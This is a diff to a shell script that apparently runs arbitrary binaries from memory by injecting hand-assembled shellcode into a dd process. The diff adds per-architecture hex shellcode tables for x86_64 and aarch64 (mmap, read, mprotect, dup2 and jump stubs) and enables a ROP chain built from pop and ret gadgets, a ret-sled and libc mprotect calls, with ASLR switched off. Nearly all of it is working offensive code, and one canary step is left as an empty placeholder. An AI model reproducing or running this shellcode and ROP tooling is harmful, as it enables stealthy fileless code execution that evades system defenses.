@@ -11,6 +11,11 @@ endian()
 {
     echo -n ${1:14:2}${1:12:2}${1:10:2}${1:8:2}${1:6:2}${1:4:2}${1:2:2}${1:0:2}
 }
+
+sc_chunk()
+{
+    echo "$sc_array" | grep -w $1 | cut -f2
+}
 # load_imm $regnum $addr
 load_imm()
 {
@@ -220,10 +225,10 @@ shellcode_loader()
     local sc=""
     if [ $1 = "bin" ]
     then
-        sc=$sc"430680d204008092a50005ca" # Prepare for the mmap()s
+        sc=$sc$(eval echo $(sc_chunk prep)) # Prepare for the mmap()s
     else
-        sc=$sc"080780d2600c8092420002ca"$(load_imm 1 $4)"010000d4" # open()
-        sc=$sc"e40300aa430280d2" # and prepare for the mmap()s
+        # open() and prepare for the mmap()s
+        sc=$sc$(eval echo $(sc_chunk openprep))
     fi
 
     for i in $(seq 0 $((phnum - 1)))
@@ -241,11 +246,7 @@ shellcode_loader()
                 local stack_bottom=0000$(echo $stack_bottom | cut -d'-' -f1)
                 local stack_size=$((0x$stack_top - 0x$stack_bottom))
                 stack_size=$(printf %08x $stack_size)
-                sc=$sc"481c80d2"
-                sc=$sc$(load_imm 0 $stack_bottom)
-                sc=$sc$(load_imm 1 $stack_size)
-                sc=$sc$(load_imm 2 "00000007") # RWX
-                sc=$sc"010000d4"
+                sc=$sc$(eval echo $(sc_chunk stackexe))
             fi
             continue
         fi
@@ -285,27 +286,8 @@ shellcode_loader()
         perm=$(printf %08x $perm)
         if [ $1 = "bin" ]
         then
-            # mmap()
-            sc=$sc"c81b80d2"
-            sc=$sc$(load_imm 0 $virt)
-            sc=$sc$(load_imm 1 $memsz)
-            sc=$sc$(load_imm 2 "00000003") # RW
-            sc=$sc"010000d4"
-
-            # read()
-            sc=$sc"e80780d2"
-            sc=$sc$(load_imm 1 $origvirt)
-            sc=$sc$(load_imm 2 $fsize)
-            sc=$sc"000000ca010000d4"
-            # and make sure to read exactly $fsize bytes
-            sc=$sc"420000cb2100008b5f0000f161ffff54"
-
-            # mprotect()
-            sc=$sc"481c80d2"
-            sc=$sc$(load_imm 0 $virt)
-            sc=$sc$(load_imm 1 $memsz)
-            sc=$sc$(load_imm 2 $perm)
-            sc=$sc"010000d4"
+            # mmap() (RW) & read() (preventing underflow) & mprotect()
+            sc=$sc$(eval echo $(sc_chunk mrmbin))
 
             # Pieces of the binary that we need to write
             # (we only load things the binary itself asks us to)
@@ -326,25 +308,13 @@ shellcode_loader()
                 local diff=$((0x$off + 0x$memsz - $filelen))
                 memsz=$((0x$memsz - diff))
                 local virt2=$((0x$virt + memsz))
-                memsz=$(printf %08x $memsz)
                 virt2=$(printf %016x $virt2)
+                memsz=$(printf %08x $memsz)
                 diff=$(printf %08x $diff)
-                sc2="f30304aa04008092a50005ca430680d2"
-                sc2=$sc2"c81b80d2"
-                sc2=$sc2$(load_imm 0 $virt2)
-                sc2=$sc2$(load_imm 1 $diff)
-                sc2=$sc2$(load_imm 2 $perm)
-                sc2=$sc2"010000d4"
-                sc2=$sc2"e40313aa"
+                sc2=$sc2$(eval echo $(sc_chunk mrmfile2)) # mmap()
             fi
 
-            # mmap()
-            sc=$sc"c81b80d2"
-            sc=$sc$(load_imm 0 $virt)
-            sc=$sc$(load_imm 1 $memsz)
-            sc=$sc$(load_imm 2 $perm)
-            sc=$sc$(load_imm 5 $off)
-            sc=$sc"010000d4"
+            sc=$sc$(eval echo $(sc_chunk mrmfile)) # mmap()
 
             sc=$sc$sc2
         fi
@@ -360,7 +330,7 @@ shellcode_loader()
     local bss_addr=0
     if [ $1 = "file" ]
     then
-        sc=$sc"280780d2e00304aa010000d4" # close()
+        sc=$sc$(eval echo $(sc_chunk close)) # close()
         bss_addr=$(search_section file $2 .bss | cut -d' ' -f3)
     else
         bss_addr=$(echo -n $bin | search_section bin "" .bss | cut -d' ' -f3)
@@ -371,20 +341,8 @@ shellcode_loader()
         # Zero until the end of page
         local bss_size=$((((bss_addr + 0x1000) & (~0xfff)) - bss_addr))
         bss_addr=$(printf %016x $bss_addr)
-        if [ $bss_size -ne 0 ]
-        then
-            sc=$sc$(load_imm 0 $bss_addr)
-            if [ $((bss_size >> 4)) -ne 0 ]
-            then
-                sc=$sc$(load_imm 1 $(printf %08x $((bss_size >> 4))))
-                sc=$sc"1f7c81a8210400d13f0000f1a1ffff54"
-            fi
-            if [ $((bss_size & 0xf)) -ne 0 ]
-            then
-                sc=$sc$(load_imm 1 $(printf %08x $((bss_size & 0xf))))
-                sc=$sc"1f140038210400d13f0000f1a1ffff54"
-            fi
-        fi
+        bss_size=$(printf %08x $((bss_size >> 3)))
+        sc=$sc$(eval echo $(sc_chunk zerobss))
     fi
 
     phnum=$(endian $(printf %016x $phnum))
@@ -447,15 +405,15 @@ craft_stack()
 
     stack=$stack$auxv$args"0000000000000000" # NULL at the end of the stack
 
-    # read() all this data into the stack and make sp point to it
+    # read() all this data into the stack and make the sp point to it
     local sc=""
     local stack_len=$((${#stack} / 2))
     local sp=$(printf %016x $((0x$stack_top - $stack_len)))
     stack_len=$(printf %08x $stack_len)
-    sc=$sc$(load_imm 0 $sp)"1f000091"
-    sc=$sc$(load_imm 2 $stack_len)
-    sc=$sc"e80780d2e1030091000000ca010000d4"
-    sc=$sc"420000cb2100008b5f0000f161ffff54"
+    sc=$sc$(eval echo $(sc_chunk stack))
+
+    # Reuse canary and PTR_MANGLE key, place them in AT_RANDOM field of the auxv
+    sc=$sc
 
     echo -n $stack $sc
 }
@@ -491,36 +449,36 @@ craft_payload2()
     # dd makes stdin and stdout point to the input and output of data (if & of)
     # Fortunately stderr still points to the terminal, so we can make
     # dup2(2, 1); dup2(2, 0); to fix this
-    sc=${sc}"420002ca080380d2400080d2210080d2010000d4400080d2e10302aa010000d4"
+    sc=$sc$(eval echo $(sc_chunk dup))
 
     if [ -n "$(echo -n $bin | search_section bin "" .interp)" ] # Dynamic binary
     then
         # Load the loader (wait... a-are we the kernel now?)
         local loadldsc=$(shellcode_loader file $interp $ld_base $interp_addr)
-        sc=${sc}$(echo $loadldsc | cut -d' ' -f1)
+        sc=$sc$(echo $loadldsc | cut -d' ' -f1)
 
         # Jump to the loader and let it do the rest
         ld_start_addr=$(od -t x8 -j 24 -N 8 $interp | head -n1 | cut -d' ' -f2)
         ld_start_addr=$((0x$ld_start_addr + 0x$ld_base))
         ld_start_addr=$(printf %016x $ld_start_addr)
 
-        sc=$sc$(load_imm 0 $ld_start_addr)
+        sc=$sc$(eval echo $(sc_chunk jmpld))
     else                                                        # Static binary
-        sc=$sc$(load_imm 0 $(endian $entry)) # Just jump to the binary's entry
+        sc=$sc$(eval echo $(sc_chunk jmpbin)) # Just jump to the binary's entry
     fi
     # Nothing happened here, dd never existed.
     # It was all a dream!
-    sc=$sc"00001fd6"
+    sc=$sc$(eval echo $(sc_chunk jmp))
 
-    if [ $DEBUG -eq 1 ]; then sc="00000014"$sc; fi
+    if [ $DEBUG -eq 1 ]; then sc=$(eval echo $(sc_chunk loop))$sc; fi
 
     local sc_len=$(printf "%016x" $((${#sc} / 2)))
-
     echo -n $sc_len $sc$writebin$stack $interp
 }
 
 read_text()
 {
+    if [ $arch = "aarch64" ]; then return; fi
     local text_off=$(search_section file $1 .text)
     local text_size=$(echo $text_off | cut -d' ' -f2)
     text_off=$(echo $text_off | cut -d' ' -f1)
@@ -530,51 +488,123 @@ read_text()
 }
 find_gadget()
 {
-    return # TODO
+    if [ $arch = "aarch64" ]; then return; fi
+    local after=${1#*$4}
+    local off=$((${#1} - ${#after} - ${#4}))
+    off=$((off / 2))
+    off=$((off + $2 + 0x$3 - 1))
+
+    printf $(endian $(printf %016x $off))
 }
 craft_rop()
 {
-    return # Can't exist without `find_gadget()'
-    # # Where is located the libc without ASLR in this system
-    # local libc_base=$(echo "$dd_maps" | grep $libc_path | head -n1 |\
-    #                   cut -d'-' -f1)
-    # libc_base=$((0x$libc_base))
+    if [ $arch = "aarch64" ]; then return; fi
+    # Where is located the libc without ASLR in this system
+    local libc_base=$(echo "$dd_maps" | grep $libc_path | head -n1 |\
+                      cut -d'-' -f1)
+    libc_base=$((0x$libc_base))
 
-    # local text=$(read_text $filename)
-    # local text_off=$(echo -n $text | cut -d' ' -f2)
-    # text=$(echo -n $text | cut -d' ' -f1)
-    # local pop_rdi=$(find_gadget $text $text_off $dd_base "5fc3")
-    # local pop_rsi=$(find_gadget $text $text_off $dd_base "5ec3")
-    # local pop_rdx=$(find_gadget $text $text_off $dd_base "5ac3")
-    # local ret=$(find_gadget $text $text_off $dd_base "c3")
-    # local map_size=$(((0x$1 & (~0xfff)) + 0x1000))
-    # map_size=$(endian $(printf %016x $map_size))
+    local text=$(read_text $filename)
+    local text_off=$(echo -n $text | cut -d' ' -f2)
+    text=$(echo -n $text | cut -d' ' -f1)
+    local pop_rdi=$(find_gadget $text $text_off $dd_base "5fc3")
+    local pop_rsi=$(find_gadget $text $text_off $dd_base "5ec3")
+    local pop_rdx=$(find_gadget $text $text_off $dd_base "5ac3")
+    local ret=$(find_gadget $text $text_off $dd_base "c3")
+    local map_size=$(((0x$1 & (~0xfff)) + 0x1000))
+    map_size=$(endian $(printf %016x $map_size))
 
-    # # Find address of mprotect() and read() in the libc
-    # local mprotect_offset=$(search_symbol $libc_path mprotect read)
-    # local read_offset=$(echo $mprotect_offset | cut -d' ' -f2)
-    # mprotect_offset=$(echo $mprotect_offset | cut -d' ' -f1)
-    # local mprotect_addr=$(($mprotect_offset + $libc_base))
-    # mprotect_addr=$(endian $(printf "%016x" $mprotect_addr))
-    # local read_addr=$(($read_offset + $libc_base))
-    # read_addr=$(endian $(printf "%016x" $read_addr))
+    # Find address of mprotect() and read() in the libc
+    local mprotect_offset=$(search_symbol $libc_path mprotect read)
+    local read_offset=$(echo $mprotect_offset | cut -d' ' -f2)
+    mprotect_offset=$(echo $mprotect_offset | cut -d' ' -f1)
+    local mprotect_addr=$(($mprotect_offset + $libc_base))
+    mprotect_addr=$(endian $(printf "%016x" $mprotect_addr))
+    local read_addr=$(($read_offset + $libc_base))
+    read_addr=$(endian $(printf "%016x" $read_addr))
 
-    # local rop=""
+    local rop=""
+    rop=$rop$pop_rdi
+    rop=$rop"0000000000000000"
+    rop=$rop$pop_rsi
+    rop=$rop$sc_addr
+    rop=$rop$pop_rdx
+    rop=$rop$(endian $1)
+    rop=$rop$read_addr
+
+    rop=$rop$pop_rdi
+    rop=$rop$sc_addr
+    rop=$rop$pop_rsi
+    rop=$rop$map_size
+    rop=$rop$pop_rdx
+    rop=$rop"0500000000000000" # R X
+    rop=$rop$mprotect_addr
+
+    rop=$rop$sc_addr
+
+    local retsled=""
+    for i in $(seq $(((4096 - ${#rop} / 2) / 8)))
+    do
+        retsled=$retsled$ret
+    done
+    echo -n $retsled$rop
 }
 
-# Program we are trying to execute
-read -r bin
+arch=$(uname -m)
+if [ $arch = "x86_64" ]
+then
+    sc_array='prep	4d31c04d89c149f7d041ba32000000
+openprep	4831c04889c6b00248bf$(endian $4)0f054989c041ba12000000
+stackexe	4831c0b00a48bf$(endian $stack_bottom)be$(endian $stack_size)ba070000000f05
+mrmbin	4831c0b00948bf$(endian $virt)be$(endian $memsz)ba030000000f054831ff48be$(endian $origvirt)48ba$(endian $fsize)4889f80f054829c24801c64885d275f04831c0b00a48bf$(endian $virt)be$(endian $memsz)ba$(endian $perm)0f05
+mrmfile2	4d89c44d31c04d89c149f7d041ba320000004831c0b00948bf$(endian $virt2)be$(endian $diff)ba$(endian $perm)0f054d89e0
+mrmfile	4831c0b00948bf$(endian $virt)be$(endian $memsz)ba$(endian $perm)49b9$(endian $off)0f05
+close	4831c0b0034c89c70f05
+zerobss	4831c0b9$(endian $bss_size)48bf$(endian $bss_addr)f348ab
+stack	48bc$(endian $sp)4831ff4889e6ba$(endian $stack_len)4889f80f0529c24801c685d275f3
+canary	48bb${at_random}64488b04252800000048890380c30864488b042530000000488903
+dup	4831c0b0024889c7b0014889c6b0210f054831c04889c6b0024889c7b0210f05
+jmpld	48b8$(endian $ld_start_addr)
+jmpbin	48b8$entry
+jmp	ffe0
+loop	ebfe
+'
+elif [ $arch = "aarch64" ]
+then
+    sc_array='prep	430680d204008092a50005ca
+openprep	080780d2600c8092420002ca$(load_imm 1 $4)010000d4e40300aa430280d2
+stackexe	481c80d2$(load_imm 0 $stack_bottom)$(load_imm 1 $stack_size)$(load_imm 2 00000007)010000d4
+mrmbin	c81b80d2$(load_imm 0 $virt)$(load_imm 1 $memsz)$(load_imm 2 00000003)010000d4e80780d2$(load_imm 1 $origvirt)$(load_imm 2 $fsize)000000ca010000d4420000cb2100008b5f0000f161ffff54481c80d2$(load_imm 0 $virt)$(load_imm 1 $memsz)$(load_imm 2 $perm)010000d4
+mrmfile2	f30304aa04008092a50005ca430680d2c81b80d2$(load_imm 0 $virt2)$(load_imm 1 $diff)$(load_imm 2 $perm)010000d4e40313aa
+mrmfile	c81b80d2$(load_imm 0 $virt)$(load_imm 1 $memsz)$(load_imm 2 $perm)$(load_imm 5 $off)010000d4
+close	280780d2e00304aa010000d4
+zerobss	$(load_imm 0 $bss_addr)$(load_imm 1 $bss_size)1f8400f8210400d13f0000f1a1ffff54
+stack	$(load_imm 0 $sp)1f000091$(load_imm 2 $stack_len)e80780d2e1030091000000ca010000d4420000cb2100008b5f0000f161ffff54
+canary	
+dup	420002ca080380d2400080d2210080d2010000d4400080d2e10302aa010000d4
+jmpld	$(load_imm 0 $ld_start_addr)
+jmpbin	$(load_imm 0 $(endian $entry))
+jmp	00001fd6
+loop	00000014
+'
+else
+    echo "This architecture is not supported."
+    exit
+fi
 
 if [ $(command -v linux64) ]
 then
     noaslr="linux64 -R"
 elif [ $(command -v setarch) ]
 then
-    noaslr="setarch `uname -m` -R"
+    noaslr="setarch $arch -R"
 else
     echo Error: I need some tool to disable ASLR. >&2
     exit
 fi
+
+# Program we are trying to execute
+read -r bin
 
 # Make zsh behave somewhat like bash
 if [ -n "$(/proc/self/exe --version 2> /dev/null | grep zsh)" ]
